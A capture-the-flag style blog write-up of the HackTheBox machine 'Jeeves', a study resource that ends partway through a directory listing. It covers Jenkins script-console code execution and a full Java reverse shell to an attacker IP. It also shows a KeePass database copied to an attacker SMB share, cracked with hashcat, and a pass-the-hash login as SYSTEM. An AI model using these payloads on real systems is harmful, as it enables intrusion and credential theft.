@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Jeeves | Jeeves was a cool box to do. I think getting the initial foothold is quite easy although I got a bit stuck looking for Jenkins version-specific...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Jeeves</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-04-23 09:53:00+01:00">Thu 23 April 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Jeeves.html">Jeeves</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Jeeves.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>Jeeves was a cool box to do. I think getting the initial foothold is quite easy although I got a bit stuck looking for Jenkins version-specific exploits. This re-iterated the concept of exploring minutiously everything you have at your disposal. The second part, privesc to root, could have been done in several different ways but I decided to go for the intended way since it involved cracking a Keepass file which I hadn't done before. </p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~]</span>
+<span class="go">└──╼ $nmap -sV -sC -p- 10.10.10.63</span>
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-29 04:55 BST</span>
+<span class="go">Nmap scan report for 10.10.10.63</span>
+<span class="go">Host is up (0.11s latency).</span>
+<span class="go">Not shown: 65531 filtered ports</span>
+<span class="go">PORT      STATE SERVICE      VERSION</span>
+<span class="go">80/tcp    open  http         Microsoft IIS httpd 10.0</span>
+<span class="go">| http-methods: </span>
+<span class="go">|_  Potentially risky methods: TRACE</span>
+<span class="go">|_http-server-header: Microsoft-IIS/10.0</span>
+<span class="go">|_http-title: Ask Jeeves</span>
+<span class="go">135/tcp   open  msrpc        Microsoft Windows RPC</span>
+<span class="go">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span>
+<span class="go">50000/tcp open  http         Jetty 9.4.z-SNAPSHOT</span>
+<span class="go">|_http-server-header: Jetty(9.4.z-SNAPSHOT)</span>
+<span class="go">|_http-title: Error 404 Not Found</span>
+<span class="go">Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Host script results:</span>
+<span class="go">|_clock-skew: mean: 4h58m35s, deviation: 0s, median: 4h58m35s</span>
+<span class="go">|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)</span>
+<span class="go">| smb-security-mode: </span>
+<span class="go">|   authentication_level: user</span>
+<span class="go">|   challenge_response: supported</span>
+<span class="go">|_  message_signing: disabled (dangerous, but default)</span>
+<span class="go">| smb2-security-mode: </span>
+<span class="go">|   2.02: </span>
+<span class="go">|_    Message signing enabled but not required</span>
+<span class="go">| smb2-time: </span>
+<span class="go">|   date: 2020-04-29T08:56:58</span>
+<span class="go">|_  start_date: 2020-04-29T07:37:19</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 211.54 seconds </span>
+</pre></div>
+
+
+<p><code>nmap</code> reveals there are two http servers, an IIS v10 running on the standard port 80, and a Jetty v9.4 running on port 50000.</p>
+<p>Navigating to the IIS webserver produces this result:</p>
+<p><img alt="" src="../images/jeeves-askjeeves.png"></p>
+<p>I checked the links but they don't take me anywhere. Then I typed something into the seach box and hit "Search" and I get this:</p>
+<p><img alt="" src="../images/jeeves-error.png"></p>
+<p>This looks like a weird output and looking better at it, seems it's an image rather than a real error. This is confirmed by looking at the page source where I can see this <code>&lt;img src="jeeves.PNG" width="90%" height="100%"&gt;</code>. I decided to have a look a the other webserver, that is Jetty:</p>
+<p><img alt="" src="../images/jeeves-jetty.png"></p>
+<p>At this stage I will run a directory scan against both webservers. The IIS scan took ages and in the end did not produce any result. Luckily I had this running in the background while checking other things. </p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~]</span>
+<span class="go">└──╼ $gobuster dir --url http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </span>
+<span class="go">===============================================================</span>
+<span class="go">Gobuster v3.0.1</span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="go">===============================================================</span>
+<span class="go">[+] Url:            http://10.10.10.63</span>
+<span class="go">[+] Threads:        10</span>
+<span class="go">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="go">[+] User Agent:     gobuster/3.0.1</span>
+<span class="go">[+] Timeout:        10s</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/04/29 04:46:55 Starting gobuster</span>
+<span class="go">===============================================================</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/04/29 05:29:41 Finished</span>
+<span class="go">===============================================================</span>
+</pre></div>
+
+
+<p>I then run the same command against the Jetty webserver:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~]</span>
+<span class="go">└──╼ $gobuster dir --url http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </span>
+<span class="go">===============================================================</span>
+<span class="go">Gobuster v3.0.1</span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="go">===============================================================</span>
+<span class="go">[+] Mode         : dir</span>
+<span class="go">[+] Url/Domain   : http://10.10.10.63:50000/</span>
+<span class="go">[+] Threads      : 200</span>
+<span class="go">[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="go">[+] User Agent:     gobuster/3.0.1</span>
+<span class="go">[+] Timeout:        10s</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/04/29 05:30:52 Starting gobuster</span>
+<span class="go">===============================================================</span>
+<span class="go">/askjeeves (Status: 302)</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/04/29 05:32:41 Finished</span>
+<span class="go">===============================================================</span>
+</pre></div>
+
+
+<p>Looking at "/askjeeves" I can see a <a href="https://www.jenkins.io/">Jenkins</a> dashboard:</p>
+<p><img alt="" src="../images/jeeves-jenkins.png"></p>
+<p>Jenkins is a popular open source automation server. The dashboard shows that it's on version 2.87. I started looking for version specific exploits but found nothing. While exploring the web application I realized that I have access to many functions and I don't need to login, perhaps some kind of anonymous authentication enabled. </p>
+<p>Within the "Manage Jenkins" menu I found "Script Console". The description states that we can type in <a href="https://groovy-lang.org/">Groovy Scripts</a> and execute it on the server. Groovy is basically a scripting language for Java.</p>
+<p>I started looking online how to execute commands using the Groovy language and I found this <a href="https://coderwall.com/p/nswp1q/calling-other-processes-from-groovy">article</a> which gives this example:</p>
+<p><code>println "ls -l".execute().text</code></p>
+<p>So because Jeeves is a Windows based box I change the command to this:</p>
+<p><code>println "whoami".execute().text</code>  </p>
+<p><img alt="" src="../images/jeeves-script-console.png"></p>
+<p>The above figure shows that the command provided <code>jeeves\kohsuke</code> as the output, indicating that we have code execution on the victim box. This is great because we will use it to get a shell.</p>
+<p>Keeping in mind the Groovy is based on Java, I decided to try a Java reverse shell and paste it in the Groovy "Script Console" and see what happens. I downloaded the following <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java">shell</a>:</p>
+<div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">host</span><span class="o">=</span><span class="s">&quot;10.10.14.2&quot;</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">port</span><span class="o">=</span><span class="mi">443</span><span class="p">;</span>
+<span class="n">String</span> <span class="n">cmd</span><span class="o">=</span><span class="s">&quot;cmd.exe&quot;</span><span class="p">;</span>
+<span class="n">Process</span> <span class="n">p</span><span class="o">=</span><span class="k">new</span> <span class="n">ProcessBuilder</span><span class="p">(</span><span class="n">cmd</span><span class="p">).</span><span class="na">redirectErrorStream</span><span class="p">(</span><span class="kc">true</span><span class="p">).</span><span class="na">start</span><span class="p">();</span><span class="n">Socket</span> <span class="n">s</span><span class="o">=</span><span class="k">new</span> <span class="n">Socket</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">);</span><span class="n">InputStream</span> <span class="n">pi</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">(),</span><span class="n">pe</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="na">getErrorStream</span><span class="p">(),</span> <span class="n">si</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="n">OutputStream</span> <span class="n">po</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">(),</span><span class="n">so</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">();</span><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">s</span><span class="p">.</span><span class="na">isClosed</span><span class="p">()){</span><span class="k">while</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="n">so</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="k">while</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="n">so</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="k">while</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="n">po</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="n">so</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="n">po</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="n">Thread</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="mi">50</span><span class="p">);</span><span class="k">try</span> <span class="p">{</span><span class="n">p</span><span class="p">.</span><span class="na">exitValue</span><span class="p">();</span><span class="k">break</span><span class="p">;}</span><span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">){}};</span><span class="n">p</span><span class="p">.</span><span class="na">destroy</span><span class="p">();</span><span class="n">s</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
+</pre></div>
+
+
+<p>and after changing the IP address to my box IP and the port I want to use (443 in this case), I paste this in the "Script Console" box and click on run:</p>
+<p><img alt="" src="../images/jeeves-shell.png"></p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~]</span>
+<span class="go">└──╼ $sudo nc -lnvp 443</span>
+<span class="go">sudo: unable to resolve host SittingDucks: Name or service not known</span>
+<span class="go">listening on [any] 443 ...</span>
+<span class="go">connect to [10.10.14.2] from (UNKNOWN) [10.10.10.63] 49676</span>
+<span class="go">Microsoft Windows [Version 10.0.10586]</span>
+<span class="gp gp-VirtualEnv">(c)</span> <span class="go">2015 Microsoft Corporation. All rights reserved.</span>
+
+<span class="go">C:\Users\Administrator\.jenkins&gt;whoami</span>
+<span class="go">whoami</span>
+<span class="go">jeeves\kohsuke</span>
+
+<span class="go">C:\Users\Administrator\.jenkins&gt;</span>
+</pre></div>
+
+
+<p>And eventually I get a shell back on a netcat listener I had already prepared, as shown above.</p>
+<p>I was also able to grab the user flag:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\Users\kohsuke\Desktop&gt;type user.txt</span>
+<span class="go">type user.txt</span>
+<span class="go">e3****************************6a</span>
+</pre></div>
+
+
+<p>Now it's time to escalate privileges. I started enumerating again and noticed there is an interesting file in "kohsuke" documents directory:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\Users\kohsuke\Documents&gt;dir</span>
+<span class="go">dir</span>
+<span class="go"> Volume in drive C has no label.</span>
+<span class="go"> Volume Serial Number is BE50-B1C9</span>
+
+<span class="go"> Directory of C:\Users\kohsuke\Documents</span>
+
+<span class="go">11/03/2017  11:18 PM    &lt;DIR&gt;          .</span>
+<span class="go">11/03/2017  11:18 PM    &lt;DIR&gt;          ..</span>
+<span class="go">09/18/2017  01:43 PM             2,846 CEH.kdbx</span>
+<span class="go">               1 File(s)          2,846 bytes</span>
+<span class="go">               2 Dir(s)   7,525,322,752 bytes free</span>
+</pre></div>
+
+
+<p><code>CEH.kdbx</code> is a <a href="https://keepass.info/">KeePass</a> password database file. If we manage to crack this file we will potentially find useful information or credentials which would allow us to root the box. To be able to do so we need to transfer this file on our attacking box so that we can use other tools to crack it.</p>
+<p>For the transfer I setup an smb server using a script beloging to the <a href="https://github.com/SecureAuthCorp/impacket">Impacket framework</a>:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/jeeves]</span>
+<span class="go">└──╼ $sudo impacket-smbserver SittingDucksShare ~/Documents/htb/boxes/jeeves</span>
+<span class="go">sudo: unable to resolve host SittingDucks: Name or service not known</span>
+<span class="go">Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation</span>
+
+<span class="go">[*] Config file parsed</span>
+<span class="go">[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span>
+<span class="go">[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span>
+<span class="go">[*] Config file parsed</span>
+<span class="go">[*] Config file parsed</span>
+<span class="go">[*] Config file parsed</span>
+</pre></div>
+
+
+<p>On the victim box I can run this command to see the smb share:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\Users\kohsuke\Documents&gt;net view \\10.10.14.2</span>
+<span class="go">net view \\10.10.14.2</span>
+<span class="go">Shared resources at \\10.10.14.2</span>
+
+<span class="gp gp-VirtualEnv">(null)</span>
+
+<span class="go">Share name         Type  Used as  Comment  </span>
+
+<span class="go">-------------------------------------------------------------------------------</span>
+<span class="go">SITTINGDUCKSSHARE  Disk                    </span>
+<span class="go">The command completed successfully.</span>
+</pre></div>
+
+
+<p>and simply use <code>copy</code> to transfer the file to my machine:</p>
+<div class="highlight"><pre><span></span><span class="go">C:#Users#kohsuke#Documents&gt;copy CEH.kdbx ##10.10.14.2#SittingDucksShare</span>
+
+<span class="go">copy CEH.kdbx ##10.10.14.2#SittingDucksShare</span>
+
+<span class="go">        1 file(s) copied.</span>
+</pre></div>
+
+
+<p>on my machine I can use <code>keepass2john</code> to convert the kdbx file to a hash we can try to crack:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/jeeves]</span>
+<span class="go">└──╼ $file CEH.kdbx </span>
+<span class="go">CEH.kdbx: Keepass password database 2.x KDBX</span>
+<span class="go">┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/jeeves]</span>
+<span class="go">└──╼ $keepass2john CEH.kdbx </span>
+<span class="gp">CEH:$keepass$</span>*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
+</pre></div>
+
+
+<p>To crack the hash we can use <code>hashcat</code>. Before doing so I check the <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat official wiki</a> and grabbed the hash-mode for keepass, that is <code>13400</code>.</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/jeeves]</span>
+<span class="go">└──╼ $hashcat -m 13400 keepassHash /usr/share/wordlists/rockyou.txt  --force</span>
+<span class="go">hashcat (v5.1.0) starting...                             </span>
+
+<span class="go">OpenCL Platform #1: The pocl project</span>
+<span class="go">====================================     </span>
+<span class="go">* Device #1: pthread-Intel(R) Xeon(R) E-2186M  CPU @ 2.90GHz, 2048/5890 MB allocatable, 4MCU</span>
+
+<span class="go">Hashes: 1 digests; 1 unique digests, 1 unique salts</span>
+<span class="go">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span>
+<span class="go">Rules: 1</span>
+
+<span class="go">Applicable optimizers:    </span>
+<span class="go">* Zero-Byte                                                                                                             </span>
+<span class="go">* Single-Hash                                                                                                           </span>
+<span class="go">* Single-Salt                                        </span>
+
+<span class="go">Minimum password length supported by kernel: 0            </span>
+<span class="go">Maximum password length supported by kernel: 256</span>
+
+
+<span class="go">&lt;SNIP&gt;</span>
+
+
+<span class="gp">$</span>keepass<span class="nv">$*</span><span class="m">2</span>*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1
+
+<span class="go">Session..........: hashcat</span>
+<span class="go">Status...........: Cracked</span>
+<span class="go">Hash.Type........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)</span>
+<span class="go">Hash.Target......: $keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea...47db48</span>
+<span class="go">Time.Started.....: Wed Apr 29 14:31:50 2020 (20 secs)</span>
+<span class="go">Time.Estimated...: Wed Apr 29 14:32:10 2020 (0 secs)</span>
+<span class="go">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span>
+<span class="go">Guess.Queue......: 1/1 (100.00%)</span>
+<span class="go">Speed.#1.........:     2847 H/s (7.16ms) @ Accel:256 Loops:128 Thr:1 Vec:8</span>
+<span class="go">Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts</span>
+<span class="go">Progress.........: 55296/14344385 (0.39%)</span>
+<span class="go">Rejected.........: 0/55296 (0.00%)</span>
+<span class="go">Restore.Point....: 54272/14344385 (0.38%)</span>
+<span class="go">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:5888-6000</span>
+<span class="go">Candidates.#1....: 250895 -&gt; grad2010</span>
+
+<span class="go">Started: Wed Apr 29 14:31:34 2020</span>
+<span class="go">Stopped: Wed Apr 29 14:32:12 2020</span>
+</pre></div>
+
+
+<p>Even though I don't have a GPU, hashcat managed to crack the hash and did not take long! The password is <code>moonshine1</code>.</p>
+<p>Now I use keepass to open the file and I provide the password just found when prompted:</p>
+<p><img alt="" src="../images/jeeves-keepass.png"></p>
+<p>We have access to the file. In the <code>C:\Users</code> directory on Jeeves I saw only two users, that is Kohsuke and Administrator so I am looking for Administrator password since we already have Kohsuke.</p>
+<p>Accordingly I take the "DC Recovery" password since the user is administrator and I try to login to Jeeves using another tool of the Impacket framework, <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py">psexec.py</a>.</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/jeeves]                                                                </span>
+<span class="go">└──╼ $psexec.py administrator:S1TjAtJHKsugh9oC4VZl@10.10.10.63</span>
+<span class="go">Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation</span>
+
+<span class="go">[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)</span>
+</pre></div>
+
+
+<p>As shown above the authentication was unsuccessful. So I started looking at the other entries in the list on the Keepass file and found a hash within the "Backup stuff" entry. The hash is the following:</p>
+<p><code>aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</code>. I was hoping this would be the Administrator hash so that we could use it to login. Looking at <code>psexec.py</code> help menu I can see this:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~]                                   </span>
+<span class="go">└──╼ $psexec.py --help                                                                                                  </span>
+<span class="go">Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation</span>
+
+<span class="go">&lt;SNIP&gt;</span>
+
+<span class="go">usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug]</span>
+
+<span class="go">authentication:</span>
+<span class="go">  -hashes LMHASH:NTHASH</span>
+<span class="go">                        NTLM hashes, format is LMHASH:NTHASH</span>
+<span class="go">&lt;SNIP&gt;</span>
+</pre></div>
+
+
+<p>The expected format is <code>LMHASH:NTHASH</code> and I think the hash we got matched this format. The hash is indeed composed by the following two parts:</p>
+<p>LMHASH: <code>aad3b435b51404eeaad3b435b51404ee</code>
+NTHASH: <code>aad3b435b51404eeaad3b435b51404ee</code></p>
+<p>We can confirm that by try to login using a pass-the-hash technique:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/jeeves]</span>
+<span class="go">└──╼ $psexec.py administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00                                                                                                                             </span>
+<span class="go">Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation</span>
+
+<span class="go">[*] Requesting shares on 10.10.10.63.....</span>
+<span class="go">[*] Found writable share ADMIN$</span>
+<span class="go">[*] Uploading file PnwdEPCo.exe</span>
+<span class="go">[*] Opening SVCManager on 10.10.10.63.....</span>
+<span class="go">[*] Creating service tzQb on 10.10.10.63.....</span>
+<span class="go">[*] Starting service tzQb.....</span>
+<span class="go">[!] Press help for extra shell commands</span>
+<span class="go">Microsoft Windows [Version 10.0.10586]</span>
+<span class="gp gp-VirtualEnv">(c)</span> <span class="go">2015 Microsoft Corporation. All rights reserved.</span>
+
+<span class="go">C:\Windows\system32&gt;whoami</span>
+<span class="go">nt authority\system</span>
+</pre></div>
+
+
+<p>The attempt worked and we are now logged in as "system" and we should be able to grab the root flag.</p>
+<div class="highlight"><pre><span></span><span class="go">C:\Users\Administrator\Desktop&gt;dir</span>
+<span class="go"> Volume in drive C has no label.</span>
+<span class="go"> Volume Serial Number is BE50-B1C9</span>
+
+<span class="go"> Directory of C:\Users\Administrator\Desktop</span>
+
+<span class="go">11/08/2017  10:05 AM    &lt;DIR&gt;          .</span>
+<span class="go">11/08/2017  10:05 AM    &lt;DIR&gt;          ..</span>
+<span class="go">12/24/2017  03:51 AM                36 hm.txt</span>
+<span class="go">11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk</span>
+<span class="go">               2 File(s)            833 bytes</span>
+<span class="go">               2 Dir(s)   7,533,301,760 bytes free</span>
+
+<span class="go">C:\Users\Administrator\Desktop&gt;type hm.txt</span>
+<span class="go">The flag is elsewhere.  Look deeper.</span>
+</pre></div>
+
+
+<p>However, the above output shows that there is a <code>hm.txt</code> file which tells us "The flag is elsewhere.  Look deeper.".</p>
+<p>So I look for hidden files:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\Users\Administrator\Desktop&gt;dir /A</span>
+<span class="go"> Volume in drive C has no label.</span>
+<span class="go"> Volume Serial Number is BE50-B1C9</span>
+
+<span class="go"> Directory of C:\Users\Administrator\Desktop</span>
+
+<span class="go">11/08/2017  10:05 AM    &lt;DIR&gt;          .</span>
+<span class="go">11/08/2017  10:05 AM    &lt;DIR&gt;          ..</span>
+<span class="go">11/03/2017  10:03 PM               282 desktop.ini</span>
+<span class="go">12/24/2017  03:51 AM                36 hm.txt</span>
+<span class="go">11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk</span>
+<span class="go">               3 File(s)          1,115 bytes</span>
+<span class="go">               2 Dir(s)   7,533,301,760 bytes free</span>
+</pre></div>
+
+
+<p>but only found a .ini file which is not relevant. Here I got stuck for a while. Eventually I had a look at <a href="https://www.youtube.com/watch?v=EKGBskG8APc&amp;feature=youtu.be&amp;t=542">ippsec video</a> as usual and learned about the <a href="https://www.howtogeek.com/363639/how-to-use-the-dir-command-in-windows/">Display Alternate Data Stream</a>:</p>
+<p>"Display Alternate Data Streams (ADS): The /R switch displays any alternate data streams (ADS) that files might contain. ADS are a feature of the NTFS file system that let files contain additional metadata for locating files by author and title."</p>
+<div class="highlight"><pre><span></span><span class="go">C:\Users\Administrator\Desktop&gt;dir /r</span>
+<span class="go"> Volume in drive C has no label.</span>
+<span class="go"> Volume Serial Number is BE50-B1C9</span>
+
+<span class="go"> Directory of C:\Users\Administrator\Desktop</span>
+
+<span class="go">11/08/2017  10:05 AM    &lt;DIR&gt;          .</span>
+<span class="go">11/08/2017  10:05 AM    &lt;DIR&gt;          ..</span>
